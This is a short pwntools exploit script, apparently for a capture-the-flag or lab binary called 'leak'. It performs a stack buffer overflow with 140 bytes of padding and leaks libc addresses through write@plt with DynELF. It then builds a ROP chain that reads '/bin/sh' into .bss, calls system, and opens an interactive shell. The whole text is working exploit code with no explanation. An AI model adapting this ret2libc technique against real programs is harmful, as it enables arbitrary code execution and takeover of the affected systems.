from pwn import *
context(log_level='debug',os ='linux',arch='i386')
e  = ELF('./leak')


p = process('./leak')
plt_write = e.plt['write']
plt_read = e.plt['read']


def leak(address):
	payload1 = 'a'*140 + p32(plt_write) + p32(0x8048340) + p32(1) + p32(address) + p32(4)
	p.send(payload1)
	data = p.recv(4)
	#print "%#x => %s" % (address, (data or '').encode('hex'))
	return data



d=DynELF(leak, elf=e)
system_addr = d.lookup('system', 'libc')

bss_addr =0x0804a000
pop3_ret = 0x080484f9

payload=flat(['a'*140,plt_read,pop3_ret,0,bss_addr,8,system_addr,0xdeadbeef,bss_addr])
#payload=flat(['a'*140,plt_read,system_addr,0,bss_addr,8])
p.sendline(payload)

p.send('/bin/sh\0')
p.interactive()
